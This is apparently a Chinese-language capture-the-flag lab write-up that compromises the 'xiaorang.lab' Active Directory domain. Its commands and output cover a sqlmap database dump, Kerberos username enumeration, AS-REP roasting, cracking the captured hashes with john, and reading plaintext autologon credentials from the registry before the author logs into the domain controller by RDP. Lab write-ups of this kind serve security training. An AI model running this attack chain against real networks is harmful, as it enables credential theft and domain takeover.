[19:48:55] [INFO] fetching columns for table 'oa_admin' in database 'oa_db'
[19:48:55] [INFO] fetching entries for table 'oa_admin' in database 'oa_db'
Database: oa_db
Table: oa_admin
[1 entry]
+----+------------------+---------------+
| id | password         | username      |
+----+------------------+---------------+
| 1  | bo2y8kAL3HnXUiQo | administrator |
+----+------------------+---------------+

[19:48:55] [INFO] table 'oa_db.oa_admin' dumped to CSV file '/home/xiaotian/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_admin.csv'
[19:48:55] [INFO] fetched data logged to text files under '/home/xiaotian/.local/share/sqlmap/output/172.22.6.38'
[19:48:55] [WARNING] your sqlmap version is outdated

[*] ending @ 19:48:55 /2026-03-06/

```

一堆账户，先用户枚举看是否是域用户

## 用户名枚举

```
cut -d ',' -f2 /home/xiaotian/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv | cut -d '@' -f1>a.txt

E:\exploit\tools\kerbrute_enum>.\kerbrute_windows_386.exe  userenum   --dc 172.22.6.12 -d xiaorang.lab E:\Users\tiand\a.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/06/26 - Ronnie Flathers @ropnop

2026/03/06 20:00:59 >  Using KDC(s):
2026/03/06 20:00:59 >   172.22.6.12:88
2026/03/06 20:01:10 >  [+] VALID USERNAME:       weixian@xiaorang.lab
2026/03/06 20:01:21 >  [+] VALID USERNAME:       yuanchang@xiaorang.lab
2026/03/06 20:01:21 >  [+] VALID USERNAME:       xuanjiang@xiaorang.lab
2026/03/06 20:01:21 >  [+] VALID USERNAME:       gaiyong@xiaorang.lab
2026/03/06 20:01:21 >  [+] VALID USERNAME:       wengbang@xiaorang.lab
2026/03/06 20:01:21 >  [+] VALID USERNAME:       xiqidi@xiaorang.lab
2026/03/06 20:01:21 >  [+] VALID USERNAME:       shuzhen@xiaorang.lab
2026/03/06 20:01:26 >  [+] VALID USERNAME:       wenbo@xiaorang.lab
2026/03/06 20:01:26 >  [+] VALID USERNAME:       weicheng@xiaorang.lab
等等。。。。

cut -d ' ' -f14 user.txt |cut -d '@' -f1>a.txt
```

尝试AS_REP Roasting（开预认证就不行了）

## AS_REP Roasting

```
E:\exploit\tools\impacket\examples>python GetNPUsers.py -usersfile E:\Users\tiand\a.txt -dc-ip 172.22.6.12 xiaorang.lab/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] User weixian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yuanchang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User xuanjiang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gaiyong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wengbang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User xiqidi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User shuzhen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wenbo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User weicheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zhenjun doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User weixian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lvhui doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yangju doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jinqing doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rubao doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jizhen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User haobei doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jicheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jingze doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User chouqian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User liangliang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zhaoxiu doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User qiyue doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tangshun doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User chebin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gaijin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User chenghui doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User beijin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jihuan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hongzhi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yanglang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User pengyuan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User duanmuxiao doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User xiyi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yifu doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tangrong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zhufeng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fusong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dongcheng doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$wenshao@XIAORANG.LAB:364426d35729a2a28b627c34d9322778$93675a133540e3d34379f0bd798e852347a84d5b99b5df8355b39adcf6223c4a4c57190e75bafd04a66f83cd7f270a54a5c84e665ed6d06d3f3c90bbc8dd62990a465661af810f5a47e5f570c7192aaead0005e9e5fa5fadeddf463ab9951e8b8d6ff886575d55b1b3fa236ea9c84fdd273d38fa4b586475b86873190c1c71b09c910a7c25bea99135fd39c74aea01125e204e23c24a48ea39e0a28c3b093cc7618a8e4756ae51cf99911164fd225bdf2ec810da0812c86ff30512276b990c0bacecc230b0b12cc3d12dd64a63750a189a2c4f986faa3d85cf5928018689491be5513222bf0010efdc419147
[-] User luwan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lili doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lianhuangchen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User huabi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wohua doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User rangsibo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User haoguang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lianggui doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User langying doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User diaocai doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User manxue doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User baqin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wenbiao doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User chengqiu doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$zhangxin@XIAORANG.LAB:da1c6e2fa776b7d7cea22aa97884f41e$e8cefebc73b06d517c49014f71e772e9fb971330d8cdd9bf7c0dbd2d3529341aa129e6cd1e69c5a33e58d625d5282cdbe3c844db234cbcec6712f060652308d5cc7c25e4e4df3db4c8f059ff527cb1c114774b26524eddbb17f0d9563ba25161e1408746fec0d4e384418fd418c9e2ede6012eca34dda52f31fae053f1772b27c4a3bbbed6ff4cc78fcdc965f0c39402565c600f2a30ab9077ef4bab458353334efb714111d5dd5c44d7781325ab2bf87447d59783f98ea4f54e97972ddadd44bd38a3c974a5cff0cffceda18cb5b637fb80dca7345bfd5481bfb5bb8a77e035b13996392e5200adf79ec52f
[-] User maqun doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User louyou doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User weishengshan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User guohong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User chuyuan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dujian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lezhong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User pangzhen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wenliang doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User luyue doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sheweiyue doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yulvxue doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ganjian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lidongjin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hongqun doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User qiaomei doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User maoda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User yexing doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ganjian doesn't have UF_DONT_REQUIRE_PREAUTH set


└─$ echo '$krb5asrep$23$wenshao@XIAORANG.LAB:364426d35729a2a28b627c34d9322778$93675a133540e3d34379f0bd798e852347a84d5b99b5df8355b39adcf6223c4a4c57190e75bafd04a66f83cd7f270a54a5c84e665ed6d06d3f3c90bbc8dd62990a465661af810f5a47e5f570c7192aaead0005e9e5fa5fadeddf463ab9951e8b8d6ff886575d55b1b3fa236ea9c84fdd273d38fa4b586475b86873190c1c71b09c910a7c25bea99135fd39c74aea01125e204e23c24a48ea39e0a28c3b093cc7618a8e4756ae51cf99911164fd225bdf2ec810da0812c86ff30512276b990c0bacecc230b0b12cc3d12dd64a63750a189a2c4f986faa3d85cf5928018689491be5513222bf0010efdc419147'>hash

┌──(xiaotian㉿xiaotian)-[/mnt/e/Users/tiand]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hellokitty       ($krb5asrep$23$wenshao@XIAORANG.LAB)
1g 0:00:00:00 DONE (2026-03-06 20:21) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

└─$ echo '$krb5asrep$23$zhangxin@XIAORANG.LAB:da1c6e2fa776b7d7cea22aa97884f41e$e8cefebc73b06d517c49014f71e772e9fb971330d8cdd9bf7c0dbd2d3529341aa129e6cd1e69c5a33e58d625d5282cdbe3c844db234cbcec6712f060652308d5cc7c25e4e4df3db4c8f059ff527cb1c114774b26524eddbb17f0d9563ba25161e1408746fec0d4e384418fd418c9e2ede6012eca34dda52f31fae053f1772b27c4a3bbbed6ff4cc78fcdc965f0c39402565c600f2a30ab9077ef4bab458353334efb714111d5dd5c44d7781325ab2bf87447d59783f98ea4f54e97972ddadd44bd38a3c974a5cff0cffceda18cb5b637fb80dca7345bfd5481bfb5bb8a77e035b13996392e5200adf79ec52f'>hash

┌──(xiaotian㉿xiaotian)-[/mnt/e/Users/tiand]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       ($krb5asrep$23$zhangxin@XIAORANG.LAB)
1g 0:00:00:00 DONE (2026-03-06 20:22) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

RDP上去找不到flag也无法提权，搞不到服务账户

先尝试横向DC

## DC

找到到domain admins路径

![image-20260306203734794](/image-20260306203734794.png)

```
C:\Users>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0xedd7ccd15
    ShutdownFlags    REG_DWORD    0x80000027
    AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180
    LastUsedUsername    REG_SZ    yuxuan
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    yuxuan
    DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L
    DefaultDomainName    REG_SZ    xiaorang.lab

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

直接rdpDC

```
C:\Users\yuxuan>type C:\Users\Administrator\flag\flag04.txt
Awesome! you got the final flag.

::::::::::::::::::::::::::    :::: ::::::::::
    :+:        :+:    +:+:+: :+:+:+:+:
    +:+        +:+    +:+ +:+:+ +:++:+
    +#+        +#+    +#+  +:+  +#++#++:++#
    +#+        +#+    +#+       +#++#+
    #+#        #+#    #+#       #+##+#
    ###    ##############       #############


flag04: flag{74967e4f-0b23-432f-806d-e8525c35d3a3}
```

然后rdp用yuxuan再登录WIN2019拿flag3
